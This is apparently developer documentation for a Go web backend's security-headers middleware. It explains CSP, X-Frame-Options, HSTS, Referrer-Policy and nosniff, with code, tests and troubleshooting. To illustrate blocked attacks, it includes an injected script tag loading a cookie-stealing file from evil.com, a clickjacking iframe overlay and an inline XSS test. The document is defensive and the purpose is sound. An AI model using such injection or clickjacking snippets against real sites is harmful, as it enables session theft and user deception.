# Security Headers Implementation

## Overview

Added comprehensive security headers to all HTTP responses to protect against XSS, clickjacking, MIME sniffing, and other client-side attacks.

## Headers Implemented

### Content-Security-Policy (CSP)

**Purpose:** Prevents Cross-Site Scripting (XSS) attacks

**Policy:**
```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self';
connect-src 'self';
frame-ancestors 'none'
```

**What it does:**
- `default-src 'self'` - Only load resources from same origin by default
- `script-src 'self'` - Only execute JavaScript from same origin (blocks inline scripts)
- `style-src 'self' 'unsafe-inline'` - Styles from same origin + inline styles (for frontend frameworks)
- `img-src 'self' data: https:` - Images from same origin, data URIs, and HTTPS URLs
- `font-src 'self'` - Only load fonts from same origin
- `connect-src 'self'` - Only connect to same origin for fetch/XHR/WebSocket
- `frame-ancestors 'none'` - Cannot be embedded in iframes (prevents clickjacking)

**Attack Prevented:**
```html
<!-- Attacker injects malicious script -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- Browser blocks it due to CSP -->
Refused to load script 'https://evil.com/steal-cookies.js'
because it violates the Content-Security-Policy directive: "script-src 'self'"
```

---

### X-Frame-Options: DENY

**Purpose:** Prevents clickjacking attacks

**What it does:**
- Prevents page from being embedded in any iframe/frame/embed

**Attack Prevented:**
```html
<!-- Attacker's evil.com page -->
<iframe src="https://confab.example.com/keys"></iframe>
<div style="opacity: 0; position: absolute; top: 0;">
  Click here to win a prize!
</div>

<!-- Browser blocks the iframe -->
Refused to display 'confab.example.com' in a frame
because it set 'X-Frame-Options' to 'deny'
```

---

### X-Content-Type-Options: nosniff

**Purpose:** Prevents MIME type sniffing attacks

**What it does:**
- Browser must respect `Content-Type` header exactly
- Won't try to guess file type based on content

**Attack Prevented:**
```
1. Attacker uploads file "image.jpg" containing JavaScript
2. Server responds with Content-Type: image/jpeg
3. Old browsers might "sniff" content and execute as JavaScript
4. With nosniff: Browser respects Content-Type, treats as image only
```

---

### Strict-Transport-Security (HSTS)

**Purpose:** Forces HTTPS connections

**Policy:**
```
max-age=31536000; includeSubDomains
```

**What it does:**
- Browser remembers to ONLY use HTTPS for 1 year
- Applies to all subdomains
- Prevents downgrade attacks

**Configuration:**
- Only set in production (`INSECURE_DEV_MODE != "true"`)
- Not set in local development to allow HTTP

**Attack Prevented:**
```
1. User visits http://confab.example.com (HTTP, not HTTPS)
2. Attacker intercepts connection (man-in-the-middle)
3. With HSTS: Browser automatically upgrades to HTTPS
4. Encrypted connection established, attack failed
```

**First Visit Caveat:**
- HSTS only works after first successful HTTPS visit
- Solution: Add domain to browser preload list (optional)

---

### Referrer-Policy: strict-origin-when-cross-origin

**Purpose:** Controls referrer information leakage

**What it does:**
- Same-origin requests: Send full URL as referrer
- Cross-origin requests: Only send origin (not full path)
- Example:
  - confab.com/sessions/secret → confab.com/keys: Sends full URL
  - confab.com/sessions/secret → github.com: Only sends confab.com

**Privacy Protection:**
```
Without policy:
User clicks link from https://confab.example.com/sessions/abc-secret-id-123
to https://external-site.com
→ external-site.com sees full URL in Referer header

With policy:
→ external-site.com only sees https://confab.example.com
```

---

### X-Permitted-Cross-Domain-Policies: none

**Purpose:** Restricts Flash/PDF cross-domain access

**What it does:**
- Prevents Flash/PDF files from making cross-domain requests
- Defense in depth (Flash mostly deprecated but still used)

---

## Implementation

### Location
`backend/internal/api/server.go` - `securityHeaders` middleware

### Code
```go
func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy", "...")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-Content-Type-Options", "nosniff")

        // HSTS only in production
        if os.Getenv("INSECURE_DEV_MODE") != "true" {
            w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        }

        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        w.Header().Set("X-Permitted-Cross-Domain-Policies", "none")

        next.ServeHTTP(w, r)
    })
}
```

### Middleware Order
```go
r.Use(middleware.Logger)      // 1. Log requests
r.Use(middleware.Recoverer)   // 2. Recover from panics
r.Use(middleware.RequestID)   // 3. Add request ID
r.Use(middleware.RealIP)      // 4. Extract real IP
r.Use(securityHeaders)        // 5. Add security headers ← NEW
r.Use(cors.Handler(...))      // 6. CORS check
```

**Why this order:**
- Security headers set early so they're on all responses
- But after logger/recoverer so errors also get headers
- Before CORS so preflight requests also get headers

---

## Testing

### Test 1: Verify Headers in Response

```bash
curl -I http://localhost:8080/health

# Expected headers:
Content-Security-Policy: default-src 'self'; script-src 'self'; ...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Permitted-Cross-Domain-Policies: none
# Note: HSTS not present in dev mode (INSECURE_DEV_MODE=true)
```

### Test 2: Verify HSTS in Production

```bash
# Production (without INSECURE_DEV_MODE)
curl -I https://confab.example.com/health

# Expected additional header:
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### Test 3: Browser DevTools Check

1. Open browser DevTools (F12)
2. Go to Network tab
3. Visit any Confab page
4. Click on request
5. Check Response Headers section
6. Verify all security headers present

### Test 4: CSP Violation Test

Try to inject inline script (should be blocked):

```javascript
// In browser console
const script = document.createElement('script');
script.textContent = 'alert("XSS")';
document.body.appendChild(script);

// Expected console error:
// Refused to execute inline script because it violates the following
// Content Security Policy directive: "script-src 'self'"
```

### Test 5: SecurityHeaders.com Scan

```bash
# Get rating from securityheaders.com
curl "https://securityheaders.com/?q=https://confab.example.com&followRedirects=on"

# Expected grade: A or A+
```

---

## Security Impact

### Attacks Prevented

✅ **Cross-Site Scripting (XSS)** - CSP blocks unauthorized scripts
✅ **Clickjacking** - X-Frame-Options prevents iframe embedding
✅ **MIME Sniffing** - X-Content-Type-Options enforces correct types
✅ **Protocol Downgrade** - HSTS forces HTTPS
✅ **Referrer Leakage** - Referrer-Policy limits information exposure
✅ **Flash/PDF Exploits** - X-Permitted-Cross-Domain-Policies blocks cross-domain

### Defense in Depth

Security headers are **one layer** in multi-layer security:

```
Layer 1: Input validation (prevent XSS at source)
Layer 2: Output encoding (escape HTML/JS)
Layer 3: CSP headers (block unauthorized scripts) ← This
Layer 4: HttpOnly cookies (prevent script access to cookies)
```

All layers work together. If one fails, others still protect.

---

## CSP Tuning for Frontend

### If Frontend Needs Inline Scripts

**Problem:** Modern frameworks (React, Vue, etc.) might use inline scripts

**Solution:** Add nonce or hash to CSP

```go
// Generate nonce per request
nonce := generateNonce()

w.Header().Set("Content-Security-Policy",
    fmt.Sprintf("script-src 'self' 'nonce-%s'", nonce))

// Frontend uses nonce in script tags
<script nonce="${nonce}">
  // Inline script allowed with matching nonce
</script>
```

### If Loading External Resources

**Problem:** Need to load fonts/images from CDN

**Current:** `img-src 'self' data: https:` allows all HTTPS images

**Tighter:** Specify exact domains
```
img-src 'self' https://cdn.example.com https://avatars.githubusercontent.com;
```

### If Using WebSockets

**Current:** `connect-src 'self'` only allows same-origin

**For external WebSocket:**
```
connect-src 'self' wss://ws.example.com;
```

---

## HSTS Considerations

### Preload List

For maximum security, add domain to HSTS preload list:

1. Update HSTS header:
   ```go
   w.Header().Set("Strict-Transport-Security",
       "max-age=31536000; includeSubDomains; preload")
   ```

2. Submit to [hstspreload.org](https://hstspreload.org)

3. Browsers will ONLY use HTTPS even on first visit

**Warning:** Very hard to undo. Only do if 100% committed to HTTPS.

### Development vs Production

**Development (INSECURE_DEV_MODE=true):**
- HSTS not set
- Can use HTTP freely
- Cookies work over HTTP

**Production (default):**
- HSTS enforces HTTPS
- Browser upgrades HTTP → HTTPS automatically
- Cookies only sent over HTTPS

---

## Monitoring

### CSP Violation Reporting

Add `report-uri` to CSP to monitor violations:

```go
w.Header().Set("Content-Security-Policy",
    "default-src 'self'; ...; report-uri /api/v1/csp-violations")
```

**Implementation:**
```go
r.Post("/api/v1/csp-violations", func(w http.ResponseWriter, r *http.Request) {
    var report CSPReport
    json.NewDecoder(r.Body).Decode(&report)

    log.Printf("CSP violation: %+v", report)
    // Store in database for analysis
    // Alert if many violations (possible attack)
})
```

### Security Header Monitoring

Check headers regularly:
```bash
# Add to monitoring/CI
#!/bin/bash
HEADERS=$(curl -sI https://confab.example.com | grep -E "(Content-Security-Policy|X-Frame-Options)")

if [ -z "$HEADERS" ]; then
    echo "ERROR: Security headers missing!"
    exit 1
fi
```

---

## Browser Compatibility

All headers are widely supported:

- ✅ **CSP:** Chrome 25+, Firefox 23+, Safari 7+, Edge 12+
- ✅ **X-Frame-Options:** All modern browsers + IE8+
- ✅ **X-Content-Type-Options:** All modern browsers + IE8+
- ✅ **HSTS:** Chrome 4+, Firefox 4+, Safari 7+, Edge 12+
- ✅ **Referrer-Policy:** Chrome 56+, Firefox 50+, Safari 11.1+, Edge 79+

**Fallback:** Old browsers ignore unknown headers, no breakage.

---

## Troubleshooting

### Issue: CSP Blocks Legitimate Resources

**Symptoms:**
- Console errors: "Refused to load..."
- Resources not loading (scripts, styles, images)

**Solution:**
1. Check browser console for exact violation
2. Update CSP to allow specific source:
   ```
   script-src 'self' https://trusted-cdn.com;
   ```

### Issue: Inline Styles Not Working

**Current:** `style-src 'self' 'unsafe-inline'` allows inline styles

**If still blocked:** Check for `<style>` tags vs inline `style=""` attributes

### Issue: HSTS Breaks Development

**Symptoms:**
- Browser refuses HTTP connections in dev
- "NET::ERR_SSL_PROTOCOL_ERROR"

**Solution:**
1. Clear HSTS cache in browser:
   - Chrome: `chrome://net-internals/#hsts` → Delete domain
   - Firefox: Delete `SiteSecurityServiceState.txt` file

2. Ensure `INSECURE_DEV_MODE=true` set in development

### Issue: Headers Not Appearing

**Check:**
1. Middleware is registered: `r.Use(securityHeaders)`
2. Middleware is before route handlers
3. Not being overwritten by other middleware

---

## Best Practices

### ✅ DO

- Keep CSP as strict as possible
- Use HSTS in production with long max-age
- Monitor CSP violations
- Test headers in staging before production
- Review headers quarterly for updates

### ❌ DON'T

- Use `'unsafe-eval'` in CSP (allows `eval()`, very dangerous)
- Use `'unsafe-inline'` for scripts (only for styles if needed)
- Set HSTS on development domains
- Use `X-Frame-Options: ALLOW-FROM` (deprecated, use CSP frame-ancestors)

---

## References

- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP: Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [SecurityHeaders.com](https://securityheaders.com) - Test your headers
- [CSP Evaluator](https://csp-evaluator.withgoogle.com) - Validate CSP
- [HSTS Preload List](https://hstspreload.org)

---

## Changelog

### 2025-01-16: Initial Implementation

- Added `securityHeaders` middleware to all routes
- Implemented Content-Security-Policy
- Added X-Frame-Options: DENY
- Added X-Content-Type-Options: nosniff
- Added HSTS (production only)
- Added Referrer-Policy
- Added X-Permitted-Cross-Domain-Policies
- Created comprehensive documentation
